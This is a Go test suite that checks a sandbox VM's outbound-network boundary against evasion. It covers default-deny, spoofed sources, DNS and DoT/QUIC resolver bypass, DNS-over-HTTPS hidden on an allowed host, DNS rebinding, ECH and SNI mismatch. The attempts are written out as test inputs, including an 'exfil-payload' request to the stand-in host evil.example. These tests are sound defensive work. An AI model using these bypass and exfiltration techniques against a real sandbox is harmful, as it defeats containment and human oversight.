package boundary

// §9 guardrail-assurance matrix, rows C9-1..C9-14: default-deny, spoofing,
// resolver bypass, DoH, rebinding, HTTPS/SVCB suppression, ECH, SNI checks.
// All RED until the real data plane satisfies the documented outcomes.

import (
	"context"
	"net/netip"
	"testing"
	"time"
)

// planRef: doc 09 §9 row "Default-deny outbound holds" (NFT-1). ADVERSARIAL.
func TestDefaultDeny_NonAllowlisted_DroppedAtL34AndViaProxy(t *testing.T) {
	h := newHarness(t)
	sess := h.newSession(t)
	ctx := context.Background()
	vm := h.b.VM(sess.Ref)

	cases := []struct {
		name string
		run  func(t *testing.T)
	}{
		{"raw_tcp_evil_443", func(t *testing.T) {
			res, err := vm.Dial(ctx, DialRequest{Proto: ProtoTCP, Dst: netip.AddrPortFrom(evilAddr, 443)})
			if err != nil {
				t.Fatalf("Dial: %v", err)
			}
			if res.Outcome != OutcomeDropped {
				t.Fatalf("Outcome = %q, want Dropped", res.Outcome)
			}
		}},
		{"http_get_evil", func(t *testing.T) {
			resp, err := vm.HTTP(ctx, HTTPRequest{Method: "GET", Host: "evil.example", Path: "/", Body: []byte("exfil-payload")})
			if err == nil && resp.Status >= 200 && resp.Status < 400 {
				t.Fatalf("HTTP to evil.example succeeded (status %d), want refused", resp.Status)
			}
			// The strict half: a deny decision with provenance must be recorded.
			requireDenyDecision(t, h.events(t, sess.Ref), "evil.example")
			// "Nothing reaches upstream": a malicious impl could forward the
			// request (header/body exfiltration), return 403, and log a deny.
			// The upstream hit-recorder must show ZERO requests for the host.
			hits, err := h.http.Requests(ctx, "evil.example")
			if err != nil {
				t.Fatalf("UpstreamHTTPControl.Requests(evil.example): %v", err)
			}
			if len(hits) != 0 {
				t.Fatalf("denied request reached upstream: evil.example received %d request(s), first %+v", len(hits), hits[0])
			}
		}},
		{"udp_random_9999", func(t *testing.T) {
			res, err := vm.Dial(ctx, DialRequest{Proto: ProtoUDP, Dst: netip.AddrPortFrom(evilAddr, 9999)})
			if err != nil {
				t.Fatalf("Dial: %v", err)
			}
			if res.Outcome != OutcomeDropped {
				t.Fatalf("Outcome = %q, want Dropped", res.Outcome)
			}
		}},
	}
	for _, tc := range cases {
		t.Run(tc.name, tc.run)
	}

	// Every drop must be nflog'd with the per-session ct mark / iface key.
	ev := h.events(t, sess.Ref)
	var drops int
	for _, f := range ev.Flows {
		if f.Outcome == OutcomeDropped {
			drops++
			if f.Iface != sess.Ref.Iface {
				t.Fatalf("drop record iface = %q, want %q (per-session attribution)", f.Iface, sess.Ref.Iface)
			}
			if f.CtMark == 0 {
				t.Fatalf("drop record for %v missing per-session ct mark", f.Dst)
			}
		}
	}
	if drops < 2 {
		t.Fatalf("expected >=2 logged drops (tcp+udp), got %d", drops)
	}
}

// planRef: doc 09 §9 row "In-VM spoofing fails" (NFT-2 Done-when). ADVERSARIAL.
func TestSpoof_ForgedSourceIP_StillInterfaceMatched(t *testing.T) {
	h := newHarness(t)
	sessA := h.newSession(t)
	sessB := h.newSession(t)
	ctx := context.Background()

	attachB, err := h.b.Attach(ctx, sessB.Ref)
	if err != nil {
		t.Fatalf("Attach(B): %v", err)
	}

	h.setUpstreamA(t, "github.com", 5*time.Minute, rotatedAddrA)
	_, addrs := h.resolveOK(t, sessA.Ref, "github.com")
	admitted := addrs[0]

	vm := h.b.VM(sessA.Ref)

	// Baseline: unspoofed dial to an admitted dst:443 is redirected into the proxy.
	base, err := vm.Dial(ctx, DialRequest{Proto: ProtoTCP, Dst: netip.AddrPortFrom(admitted, 443)})
	if err != nil {
		t.Fatalf("baseline Dial: %v", err)
	}
	if base.Outcome != OutcomeRedirected || base.RedirectedTo != RedirectTLSProxy {
		t.Fatalf("baseline = %+v, want Redirected to %s", base, RedirectTLSProxy)
	}

	// Spoofed sources must change NOTHING: matching is iifname, never src IP.
	for _, spoof := range []netip.Addr{hostGatewayAddr, attachB.VMAddr} {
		t.Run("spoof_"+spoof.String(), func(t *testing.T) {
			res, err := vm.Dial(ctx, DialRequest{Proto: ProtoTCP, Dst: netip.AddrPortFrom(admitted, 443), SpoofSourceIP: spoof})
			if err != nil {
				t.Fatalf("Dial: %v", err)
			}
			if res != base {
				t.Fatalf("spoofed result %+v != unspoofed %+v (outcome must be independent of SpoofSourceIP)", res, base)
			}
			// Spoof grants no extra reach beyond A's own gate.
			deny, err := vm.Dial(ctx, DialRequest{Proto: ProtoTCP, Dst: netip.AddrPortFrom(evilAddr, 443), SpoofSourceIP: spoof})
			if err != nil {
				t.Fatalf("Dial(evil): %v", err)
			}
			if deny.Outcome != OutcomeDropped {
				t.Fatalf("spoofed dial to non-allowlisted dst = %q, want Dropped", deny.Outcome)
			}
		})
	}

	// The spoofed drops are still attributed to A's interface.
	ev := h.events(t, sessA.Ref)
	found := false
	for _, f := range ev.Flows {
		if f.Outcome == OutcomeDropped && f.Dst.Addr() == evilAddr && f.Iface == sessA.Ref.Iface {
			found = true
		}
	}
	if !found {
		t.Fatal("spoofed drop not logged against session A's interface")
	}
}

// planRef: doc 09 §9 row "Port-53/DoT/QUIC bypass fails" (NFT-4 Done-when). ADVERSARIAL.
func TestResolverBypass_Port53AtPublicIP_StillHitsGate(t *testing.T) {
	h := newHarness(t)
	sess := h.newSession(t)
	ctx := context.Background()

	for _, ns := range []string{"8.8.8.8", "1.1.1.1"} {
		t.Run("nameserver_"+ns, func(t *testing.T) {
			resp, err := h.b.VM(sess.Ref).ResolveDNS(ctx, DNSQuery{
				Name: "github.com", Type: DNSTypeA, Nameserver: netip.MustParseAddr(ns),
			})
			if err != nil {
				t.Fatalf("ResolveDNS via %s: %v", ns, err)
			}
			if resp.ServedBy != ServedByDNSGate {
				t.Fatalf("ServedBy = %q, want %q (all dst-port-53 lands on the gate)", resp.ServedBy, ServedByDNSGate)
			}
			if resp.Rcode != RcodeNoError || len(resp.Answers) == 0 {
				t.Fatalf("gated answer missing: rcode=%s answers=%d", resp.Rcode, len(resp.Answers))
			}
			if resp.MinTTL < TTLClampMin || resp.MinTTL > TTLClampMax {
				t.Fatalf("answer TTL %v outside clamp [%v, %v]", resp.MinTTL, TTLClampMin, TTLClampMax)
			}
		})
	}

	ev := h.events(t, sess.Ref)
	var dnsEvents int
	for _, d := range ev.Dns {
		if d.Query == "github.com" && d.Session == sess.Ref {
			dnsEvents++
		}
	}
	if dnsEvents < 2 {
		t.Fatalf("want a DnsEvent per bypass attempt (2), got %d", dnsEvents)
	}
}

// planRef: doc 09 §9 row "Port-53/DoT/QUIC bypass fails" (NFT-4). ADVERSARIAL.
func TestResolverBypass_DoT853_Dropped(t *testing.T) {
	h := newHarness(t)
	sess := h.newSession(t)
	ctx := context.Background()

	for _, dst := range []netip.Addr{netip.MustParseAddr("8.8.8.8"), netip.MustParseAddr("8.8.4.4")} {
		t.Run(dst.String(), func(t *testing.T) {
			res, err := h.b.VM(sess.Ref).Dial(ctx, DialRequest{Proto: ProtoTCP, Dst: netip.AddrPortFrom(dst, 853)})
			if err != nil {
				t.Fatalf("Dial: %v", err)
			}
			if res.Outcome != OutcomeDropped {
				t.Fatalf("DoT dial = %q, want Dropped", res.Outcome)
			}
		})
	}

	ev := h.events(t, sess.Ref)
	logged := false
	for _, f := range ev.Flows {
		if f.Outcome == OutcomeDropped && f.Dst.Port() == 853 {
			logged = true
		}
	}
	if !logged {
		t.Fatal("DoT drop not logged")
	}
}

// planRef: doc 09 §9 row "Port-53/DoT/QUIC bypass fails" (NFT-4, OQ5). ADVERSARIAL.
func TestResolverBypass_QUICudp443_DroppedForcingTCPFallback(t *testing.T) {
	h := newHarness(t)
	sess := h.newSession(t)
	ctx := context.Background()

	h.setUpstreamA(t, "github.com", 5*time.Minute, rotatedAddrA)
	_, addrs := h.resolveOK(t, sess.Ref, "github.com")
	admitted := addrs[0]
	vm := h.b.VM(sess.Ref)

	quic, err := vm.Dial(ctx, DialRequest{Proto: ProtoUDP, Dst: netip.AddrPortFrom(admitted, 443)})
	if err != nil {
		t.Fatalf("UDP/443 dial: %v", err)
	}
	if quic.Outcome != OutcomeDropped {
		t.Fatalf("QUIC (udp/443) to an ADMITTED ip = %q, want Dropped", quic.Outcome)
	}

	// TCP fallback to the same host must succeed through the proxy path.
	tcp, err := vm.Dial(ctx, DialRequest{Proto: ProtoTCP, Dst: netip.AddrPortFrom(admitted, 443)})
	if err != nil {
		t.Fatalf("TCP/443 dial: %v", err)
	}
	if tcp.Outcome != OutcomeRedirected || tcp.RedirectedTo != RedirectTLSProxy {
		t.Fatalf("TCP fallback = %+v, want Redirected to %s", tcp, RedirectTLSProxy)
	}
}

// planRef: doc 09 §9 row "DoH endpoint blocking — baseline half" (POL-2 + NFT-4). ADVERSARIAL.
func TestDoH_BaselineBlocklistDomain_RefusedBySNIandDNS(t *testing.T) {
	h := newHarness(t)
	sess := h.newSession(t)
	ctx := context.Background()
	vm := h.b.VM(sess.Ref)

	// Admit sharedCDNAddr through an allowed cover domain FIRST, so the TLS
	// half exercises the TLS-1 SNI blocklist check at an ADMITTED IP — a
	// refusal here cannot be explained away by an admission-map miss.
	const cover = "cdn-allowed.example"
	h.setUpstreamA(t, cover, 5*time.Minute, sharedCDNAddr)
	if _, err := h.b.Policy().Grant(ctx, AllowGrant{
		Session:  sess.Ref,
		Resource: ResourceRef{Kind: ResourceDomain, Name: cover},
		TTL:      time.Hour,
	}); err != nil {
		t.Fatalf("Grant(%s): %v", cover, err)
	}
	h.resolveOK(t, sess.Ref, cover)
	if !allowSetContains(h.allowSet(t, sess.Ref), sharedCDNAddr) {
		t.Fatalf("cover domain did not admit %v; the SNI-check half needs an admitted IP", sharedCDNAddr)
	}

	for _, doh := range BaselineBlockedResolvers {
		t.Run(doh, func(t *testing.T) {
			resp, err := vm.ResolveDNS(ctx, DNSQuery{Name: doh, Type: DNSTypeA})
			if err != nil {
				t.Fatalf("ResolveDNS: %v", err)
			}
			if resp.Rcode == RcodeNoError && len(resp.Answers) > 0 {
				t.Fatalf("DoH resolver %s resolved (%d answers); want denied", doh, len(resp.Answers))
			}
			if resp.Rcode != RcodeRefused {
				t.Fatalf("rcode = %s, want REFUSED (OQ6 denial semantics)", resp.Rcode)
			}

			tls, err := vm.TLSConnect(ctx, TLSConnectRequest{SNI: doh, DstIP: sharedCDNAddr})
			if err != nil {
				t.Fatalf("TLSConnect: %v", err)
			}
			if tls.Outcome != TLSRefused {
				t.Fatalf("TLS to blocked DoH SNI at an ADMITTED IP = %q, want Refused (the TLS-1 SNI blocklist check itself)", tls.Outcome)
			}

			// "Blocked by both": a DISTINCT deny decision per half — the DNS
			// denial AND the TLS-1 SNI check — each with blocklist provenance.
			ev := h.events(t, sess.Ref)
			var denies []PolicyDecision
			for _, d := range ev.Decisions {
				if d.Decision == "deny" && d.Resource == doh {
					denies = append(denies, d)
				}
			}
			if len(denies) < 2 {
				t.Fatalf("want distinct deny decisions for the DNS denial AND the TLS-1 SNI check of %s, got %d", doh, len(denies))
			}
			for _, d := range denies {
				requireProvenance(t, d.Rule, "blocklist deny for "+doh)
				if d.Rule.Layer != "system" {
					t.Fatalf("blocklist provenance layer = %q, want %q (D64 baseline)", d.Rule.Layer, "system")
				}
			}
		})
	}
}

// planRef: doc 09 §9 row "DoH endpoint blocking — HTTP-level half" (TLS-6). ADVERSARIAL.
func TestDoH_HTTPLevelOnAllowedHost_Blocked(t *testing.T) {
	h := newHarness(t)
	sess := h.newSession(t)
	ctx := context.Background()
	vm := h.b.VM(sess.Ref)

	cases := []struct {
		name string
		req  HTTPRequest
	}{
		{"post_dns_message", HTTPRequest{
			Method:  "POST",
			Host:    "raw.githubusercontent.com", // allowed host, abused as DoH
			Path:    "/dns-query",
			Headers: map[string]string{"Content-Type": "application/dns-message"},
			Body:    []byte{0x00, 0x01, 0x01, 0x00}, // wire-format query stub
		}},
		{"get_dns_param", HTTPRequest{
			Method: "GET",
			Host:   "raw.githubusercontent.com",
			Path:   "/dns-query?dns=AAABAAABAAAAAAAAA2lzYwNvcmcAAAEAAQ",
		}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			resp, err := vm.HTTP(ctx, tc.req)
			if err == nil && resp.Status >= 200 && resp.Status < 300 {
				t.Fatalf("DoH on allowed host returned %d; want blocked at HTTP level", resp.Status)
			}
			if err == nil && len(resp.Body) > 0 {
				t.Fatal("a DoH response body was returned to the VM")
			}

			ev := h.events(t, sess.Ref)
			var blocked *HttpEvent
			for i, e := range ev.Http {
				if e.Host == tc.req.Host && e.Blocked {
					blocked = &ev.Http[i]
				}
			}
			if blocked == nil {
				t.Fatal("no Blocked HttpEvent recorded for the DoH attempt")
			}
			requireProvenance(t, blocked.Rule, "DoH HTTP block")
			requireDenyDecision(t, ev, tc.req.Host+tc.req.Path)
		})
	}
}

// planRef: doc 09 §9 row "Rebinding fails; allow-set never silently widens"
// (DNS-4 + NFT-3; DNS-4 Done-when). ADVERSARIAL.
func TestRebinding_ReResolveNewPublicIP_NoSilentWiden(t *testing.T) {
	h := newHarness(t)
	sess := h.newSession(t)
	const name = "github.com"

	h.setUpstreamA(t, name, TTLClampMin, rotatedAddrA)
	resp1, addrs1 := h.resolveOK(t, sess.Ref, name)
	if len(addrs1) != 1 || addrs1[0] != rotatedAddrA {
		t.Fatalf("first resolution answered %v, want [%v]", addrs1, rotatedAddrA)
	}
	if !allowSetContains(h.allowSet(t, sess.Ref), rotatedAddrA) {
		t.Fatal("A not admitted after first resolution")
	}

	// Upstream rotates to B; expire A's entry (TTL + max grace), re-resolve.
	h.setUpstreamA(t, name, TTLClampMin, rotatedAddrB)
	h.clock.Advance(resp1.MinTTL + AllowSetGraceMax + time.Second)

	_, addrs2 := h.resolveOK(t, sess.Ref, name)
	if len(addrs2) != 1 || addrs2[0] != rotatedAddrB {
		t.Fatalf("re-resolution answered %v, want [%v]", addrs2, rotatedAddrB)
	}

	set := h.allowSet(t, sess.Ref)
	if !allowSetContains(set, rotatedAddrB) {
		t.Fatal("B not admitted via fresh admission after rotation")
	}
	if allowSetContains(set, rotatedAddrA) {
		t.Fatal("stale address A retained beyond TTL+grace (silent widen)")
	}
	if len(set) != 1 {
		t.Fatalf("allow-set widened: %d entries, want exactly 1", len(set))
	}
}

// planRef: doc 09 §9 row "Rebinding fails" (DNS-4 rule 2 dual-stack scrub). ADVERSARIAL.
func TestRebinding_PrivateLinkLocalLoopbackHost_Scrubbed(t *testing.T) {
	h := newHarness(t)
	sess := h.newSession(t)
	const name = "github.com"

	evil := []netip.Addr{
		netip.MustParseAddr("10.0.0.5"),
		netip.MustParseAddr("127.0.0.1"),
		netip.MustParseAddr("169.254.1.1"),
		hostGatewayAddr,
		netip.MustParseAddr("::1"),
		netip.MustParseAddr("fe80::1"),
		netip.MustParseAddr("fc00::1"),
	}

	for _, bad := range evil {
		t.Run(bad.String(), func(t *testing.T) {
			typ := DNSTypeA
			if bad.Is6() {
				typ = DNSTypeAAAA
			}
			if err := h.dns.SetAnswers(context.Background(), name, []DNSRecord{
				{Name: name, Type: typ, Addr: bad, TTL: 5 * time.Minute},
				{Name: name, Type: DNSTypeA, Addr: rotatedAddrA, TTL: 5 * time.Minute},
			}); err != nil {
				t.Fatalf("SetAnswers: %v", err)
			}

			resp, err := h.b.VM(sess.Ref).ResolveDNS(context.Background(), DNSQuery{Name: name, Type: typ})
			if err != nil {
				t.Fatalf("ResolveDNS: %v", err)
			}
			for _, rec := range resp.Answers {
				if rec.Addr == bad {
					t.Fatalf("answer to VM carries unscrubbed %v", bad)
				}
			}
			for _, fam := range []IPFamily{IPv4, IPv6} {
				entries, err := h.b.Inspect().AllowSet(context.Background(), sess.Ref, fam)
				if err != nil {
					t.Fatalf("AllowSet(%s): %v", fam, err)
				}
				if allowSetContains(entries, bad) {
					t.Fatalf("%v inserted into %s allow-set", bad, fam)
				}
			}

			ev := h.events(t, sess.Ref)
			scrubbed := false
			for _, d := range ev.Dns {
				if d.Kind != "rebinding-scrub" {
					continue
				}
				for _, a := range d.Scrubbed {
					if a == bad {
						scrubbed = true
					}
				}
			}
			if !scrubbed {
				t.Fatalf("no rebinding-scrub DnsEvent recorded for %v", bad)
			}
		})
	}
}

// planRef: doc 09 §9 row "Rebinding fails incl. IPv4-mapped IPv6" (DNS-4 rule 2). ADVERSARIAL.
func TestRebinding_IPv4MappedIPv6AndNAT64_Scrubbed(t *testing.T) {
	h := newHarness(t)
	sess := h.newSession(t)
	const name = "github.com"

	embedded := []netip.Addr{
		netip.MustParseAddr("::ffff:10.0.0.5"), // IPv4-mapped, embeds 10.0.0.5
		netip.MustParseAddr("64:ff9b::a00:5"),  // NAT64, embeds 10.0.0.5
	}

	before := h.allowSet(t, sess.Ref)
	for _, bad := range embedded {
		t.Run(bad.String(), func(t *testing.T) {
			if err := h.dns.SetAnswers(context.Background(), name, []DNSRecord{
				{Name: name, Type: DNSTypeAAAA, Addr: bad, TTL: 5 * time.Minute},
			}); err != nil {
				t.Fatalf("SetAnswers: %v", err)
			}
			resp, err := h.b.VM(sess.Ref).ResolveDNS(context.Background(), DNSQuery{Name: name, Type: DNSTypeAAAA})
			if err != nil {
				t.Fatalf("ResolveDNS: %v", err)
			}
			for _, rec := range resp.Answers {
				if rec.Addr == bad {
					t.Fatalf("embedded-v4 answer %v reached the VM unscrubbed", bad)
				}
			}
			for _, fam := range []IPFamily{IPv4, IPv6} {
				entries, err := h.b.Inspect().AllowSet(context.Background(), sess.Ref, fam)
				if err != nil {
					t.Fatalf("AllowSet(%s): %v", fam, err)
				}
				if allowSetContains(entries, bad) || allowSetContains(entries, netip.MustParseAddr("10.0.0.5")) {
					t.Fatalf("embedded-v4 admission leaked %v into %s set", bad, fam)
				}
			}
		})
	}
	after := h.allowSet(t, sess.Ref)
	if len(after) != len(before) {
		t.Fatalf("allow-set gained %d entries from embedded-v4 answers", len(after)-len(before))
	}
}

// planRef: doc 09 §9 row "no HTTPS/SVCB answer reaches a VM" (DNS-4 rule 4). ADVERSARIAL.
func TestHTTPSSVCB_Type65Suppressed_NoneReachesVM(t *testing.T) {
	h := newHarness(t)
	sess := h.newSession(t)
	const name = "github.com"

	// Upstream really serves HTTPS/SVCB records (with an ECH config target).
	if err := h.dns.SetAnswers(context.Background(), name, []DNSRecord{
		{Name: name, Type: DNSTypeHTTPS, Target: "ech-config.cdn.example", TTL: 5 * time.Minute},
		{Name: name, Type: DNSTypeSVCB, Target: "svcb.cdn.example", TTL: 5 * time.Minute},
		{Name: name, Type: DNSTypeA, Addr: rotatedAddrA, TTL: 5 * time.Minute},
	}); err != nil {
		t.Fatalf("SetAnswers: %v", err)
	}

	for _, typ := range []DNSType{DNSTypeHTTPS, DNSTypeSVCB} {
		t.Run(string(typ), func(t *testing.T) {
			resp, err := h.b.VM(sess.Ref).ResolveDNS(context.Background(), DNSQuery{Name: name, Type: typ})
			if err != nil {
				t.Fatalf("ResolveDNS(%s): %v", typ, err)
			}
			if resp.Rcode != RcodeNoError {
				t.Fatalf("rcode = %s, want NOERROR/NODATA-style empty answer", resp.Rcode)
			}
			if len(resp.Answers) != 0 {
				t.Fatalf("type-%s answer reached the VM: %+v", typ, resp.Answers)
			}
			if resp.ServedBy != ServedByDNSGate {
				t.Fatalf("ServedBy = %q, want %q", resp.ServedBy, ServedByDNSGate)
			}
		})
	}

	// And no record of those types ever rides along in an A answer.
	resp, err := h.b.VM(sess.Ref).ResolveDNS(context.Background(), DNSQuery{Name: name, Type: DNSTypeA})
	if err != nil {
		t.Fatalf("ResolveDNS(A): %v", err)
	}
	for _, rec := range resp.Answers {
		if rec.Type == DNSTypeHTTPS || rec.Type == DNSTypeSVCB {
			t.Fatalf("type-%s record smuggled into an A answer", rec.Type)
		}
	}
}

// planRef: doc 09 §9 row "ECH can't hide a domain behind an admitted IP"
// (TLS-1 edge rule: ECH ClientHellos refused, GREASE included). ADVERSARIAL.
func TestECH_ClientHelloRefused(t *testing.T) {
	h := newHarness(t)
	sess := h.newSession(t)

	h.setUpstreamA(t, "cdn-allowed.example", 5*time.Minute, sharedCDNAddr)
	// Make the harness rig allow cdn-allowed.example for this session.
	if _, err := h.b.Policy().Grant(context.Background(), AllowGrant{
		Session:  sess.Ref,
		Resource: ResourceRef{Kind: ResourceDomain, Name: "cdn-allowed.example"},
		TTL:      time.Hour,
	}); err != nil {
		t.Fatalf("Grant: %v", err)
	}
	h.resolveOK(t, sess.Ref, "cdn-allowed.example")

	// "GREASE included": a GREASE-ECH ClientHello (no real config) is
	// indistinguishable cover traffic and must be refused exactly like real
	// ECH — otherwise GREASE becomes the bypass costume.
	cases := []struct {
		name string
		req  TLSConnectRequest
	}{
		{"real_ech", TLSConnectRequest{SNI: "cdn-allowed.example", DstIP: sharedCDNAddr, OfferECH: true}},
		{"grease_ech", TLSConnectRequest{SNI: "cdn-allowed.example", DstIP: sharedCDNAddr, GreaseECH: true}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res, err := h.b.VM(sess.Ref).TLSConnect(context.Background(), tc.req)
			if err != nil {
				t.Fatalf("TLSConnect: %v", err)
			}
			if res.Outcome != TLSRefused {
				t.Fatalf("%s ClientHello outcome = %q, want Refused (no opaque tunnel to the shared CDN IP)", tc.name, res.Outcome)
			}
		})
	}
}

// planRef: doc 09 §9 row "ECH can't hide a non-admitted domain behind an
// admitted IP" (DNS-4 rule 4 + TLS-1, integrated). ADVERSARIAL.
func TestECH_CannotHideDomainBehindAdmittedIP_Integrated(t *testing.T) {
	h := newHarness(t)
	sess := h.newSession(t)
	ctx := context.Background()
	vm := h.b.VM(sess.Ref)

	// cdn-allowed.example is admitted at shared IP X; it has a real HTTPS
	// record upstream (the ECH config carrier).
	if err := h.dns.SetAnswers(ctx, "cdn-allowed.example", []DNSRecord{
		{Name: "cdn-allowed.example", Type: DNSTypeA, Addr: sharedCDNAddr, TTL: 5 * time.Minute},
		{Name: "cdn-allowed.example", Type: DNSTypeHTTPS, Target: "ech.cdn.example", TTL: 5 * time.Minute},
	}); err != nil {
		t.Fatalf("SetAnswers: %v", err)
	}
	if _, err := h.b.Policy().Grant(ctx, AllowGrant{
		Session: sess.Ref, Resource: ResourceRef{Kind: ResourceDomain, Name: "cdn-allowed.example"}, TTL: time.Hour,
	}); err != nil {
		t.Fatalf("Grant: %v", err)
	}
	h.resolveOK(t, sess.Ref, "cdn-allowed.example")

	// 1. No ECH config is obtainable: HTTPS-record query comes back empty.
	hr, err := vm.ResolveDNS(ctx, DNSQuery{Name: "cdn-allowed.example", Type: DNSTypeHTTPS})
	if err != nil {
		t.Fatalf("ResolveDNS(HTTPS): %v", err)
	}
	if len(hr.Answers) != 0 {
		t.Fatalf("ECH config leaked to VM via HTTPS record: %+v", hr.Answers)
	}

	// 2. The ECH attempt at the admitted shared IP is refused.
	ech, err := vm.TLSConnect(ctx, TLSConnectRequest{SNI: "cdn-allowed.example", DstIP: sharedCDNAddr, OfferECH: true})
	if err != nil {
		t.Fatalf("TLSConnect(ECH): %v", err)
	}
	if ech.Outcome != TLSRefused {
		t.Fatalf("ECH at admitted shared IP = %q, want Refused", ech.Outcome)
	}

	// 3. The hidden domain cannot ride X: plaintext SNI for it is refused too.
	hidden, err := vm.TLSConnect(ctx, TLSConnectRequest{SNI: "evil-notadmitted.example", DstIP: sharedCDNAddr})
	if err != nil {
		t.Fatalf("TLSConnect(hidden): %v", err)
	}
	if hidden.Outcome != TLSRefused {
		t.Fatalf("non-admitted domain at admitted IP = %q, want Refused", hidden.Outcome)
	}

	// 4. Only the admitted domain proceeds.
	ok, err := vm.TLSConnect(ctx, TLSConnectRequest{SNI: "cdn-allowed.example", DstIP: sharedCDNAddr})
	if err != nil {
		t.Fatalf("TLSConnect(admitted): %v", err)
	}
	if ok.Outcome == TLSRefused {
		t.Fatalf("admitted domain refused; want Tunneled or Inspected, got %q", ok.Outcome)
	}
}

// planRef: doc 09 TLS-1 Done-when; doc 03 OQ1 CDN shared-IP hole. ADVERSARIAL.
func TestSNIMismatch_AllowedIPDisallowedSNI_Refused(t *testing.T) {
	h := newHarness(t)
	sess := h.newSession(t)
	ctx := context.Background()

	// domainA admits the shared IP.
	h.setUpstreamA(t, "github.com", 5*time.Minute, sharedCDNAddr)
	h.resolveOK(t, sess.Ref, "github.com")

	const domainB = "evil-notadmitted.example"
	res, err := h.b.VM(sess.Ref).TLSConnect(ctx, TLSConnectRequest{SNI: domainB, DstIP: sharedCDNAddr})
	if err != nil {
		t.Fatalf("TLSConnect: %v", err)
	}
	if res.Outcome != TLSRefused {
		t.Fatalf("SNI %q at IP admitted for github.com = %q, want Refused", domainB, res.Outcome)
	}

	// The admission map must miss for (domainB, IP).
	if e, ok := admissionFor(h.admissionMap(t, sess.Ref), domainB); ok {
		t.Fatalf("admission map unexpectedly holds %q -> %v", domainB, e.Addrs)
	}
	requireDenyDecision(t, h.events(t, sess.Ref), domainB)
}

// planRef: doc 09 TLS-1 Done-when (edge rules: absent SNI, IP-literal). ADVERSARIAL.
func TestAbsentSNIandIPLiteralTLS_RefusedByDefault(t *testing.T) {
	h := newHarness(t)
	sess := h.newSession(t)
	ctx := context.Background()

	h.setUpstreamA(t, "github.com", 5*time.Minute, rotatedAddrA)
	_, addrs := h.resolveOK(t, sess.Ref, "github.com")
	admitted := addrs[0]

	cases := []struct {
		name string
		req  TLSConnectRequest
	}{
		{"absent_sni", TLSConnectRequest{SNI: "", DstIP: admitted}},
		{"ip_literal", TLSConnectRequest{IPLiteral: true, SNI: admitted.String(), DstIP: admitted}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res, err := h.b.VM(sess.Ref).TLSConnect(ctx, tc.req)
			if err != nil {
				t.Fatalf("TLSConnect: %v", err)
			}
			if res.Outcome != TLSRefused {
				t.Fatalf("outcome = %q, want Refused (even at an admitted IP %s)", res.Outcome, admitted)
			}
		})
	}
}
